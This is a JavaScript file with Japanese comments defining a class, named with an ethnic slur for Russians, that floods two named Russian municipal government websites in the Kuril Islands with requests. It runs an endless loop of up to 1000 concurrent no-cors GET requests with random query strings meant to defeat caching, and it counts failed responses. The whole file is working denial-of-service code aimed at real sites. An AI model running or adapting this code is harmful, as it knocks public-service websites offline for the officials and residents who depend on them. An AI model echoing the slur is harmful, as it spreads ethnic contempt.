// クラス名
class Cyber_Punish_Kacap {

    // コンストラクタ
    constructor(limit) {
      // 1秒ごとの送信頻度を設定
      this.CONCURRENCY_LIMIT = limit;
      // 非同期関数を定義
      this.fetchWithTimeoutGet = this.fetchWithTimeoutGet.bind(this);   // リクエスト送信。
      this.fetchWithTimeoutPost = this.fetchWithTimeoutPost.bind(this);   // リクエスト送信。
      this.punish_target = this.punish_target.bind(this);         // 各サイトにデータリクエストを送る。
    }
  
    // 対象のサイトを指定
    target_urls = {
         'http://курильск-адм.рф/': { number_of_requests: 0, number_of_errored_responses: 0 },       // クリル管区
         'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },  // 南クリル管区
    };
  
    // 1秒ごとの送信頻度
    CONCURRENCY_LIMIT = 1000;
    queue = [];
  
    // リクエスト送信
    async fetchWithTimeoutGet(resource, options) {
      // コントローラーを取得
      const controller = new AbortController();
      // IDを取得
      const id = setTimeout(() => controller.abort(), options.timeout);
      // リクエスト処理を返す。
      return fetch(resource, {
        method: 'GET',              // GET方式
        mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
        signal: controller.signal   // オブジェクトのインスタンスを返
      }).then((response) => {       // 成功した場合
        clearTimeout(id);			  // タイムアウトを消す。
        return response;			  // 応答結果を返す。
      }).catch((error) => {		  // 失敗した場合
        console.log(error.code);    // エラーコードを出力
        clearTimeout(id);			  // タイムアウトを消す。
        throw error;				  // エラーを投げる。
      });
    }

    // リクエスト送信
    async fetchWithTimeoutPost(resource, options) {
      // コントローラーを取得
      const controller = new AbortController();
      // IDを取得
      const id = setTimeout(() => controller.abort(), options.timeout);
      // リクエスト処理を返す。
      return fetch(resource, {
        method: 'POST',              // GET方式
        mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
        signal: controller.signal   // オブジェクトのインスタンスを返
      }).then((response) => {       // 成功した場合
        clearTimeout(id);			  // タイムアウトを消す。
        return response;			  // 応答結果を返す。
      }).catch((error) => {		  // 失敗した場合
        console.log(error.code);    // エラーコードを出力
        clearTimeout(id);			  // タイムアウトを消す。
        throw error;				  // エラーを投げる。
      });
    }
  
    // 各ターゲットにデータ送信する。
    async punish_target(target) {
      //for文を使った無限ループ
      for (var i = 0;; ++i) {
        // リクエストの数が規定数になったら
        if (this.queue.length > this.CONCURRENCY_LIMIT) {
          // 最初のリクエストを削除する。
          await this.queue.shift()
        }
        // 乱数を生成
        var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
        // 送信リクエストを追加する。
        this.queue.push(
          // 関数を実行する(時間制限：1秒)
          this.fetchWithTimeoutGet(target+rand, { timeout: 1000 })
            // エラーがある場合はエラーを取得する。
            .catch((error) => {
              if (error.code === 20 /* ABORT */) {
                return;
              }
              this.target_urls[target].number_of_errored_responses++;
            })
            // 処理後の処理をする。
            .then((response) => {
              // エラーがある場合はエラー処理を入れる。
              if (response && !response.ok) {
                this.target_urls[target].number_of_errored_responses++;
              }
              // リクエスト数を追加する。
              this.target_urls[target].number_of_requests++;
            })
        )
      }
    }       
    // 実行関数
    attack_start(){
     // 全てのターゲット要素に対してデータ送信処理を実行する。
     Object.keys(this.target_urls).map(this.punish_target);
    }
}
  
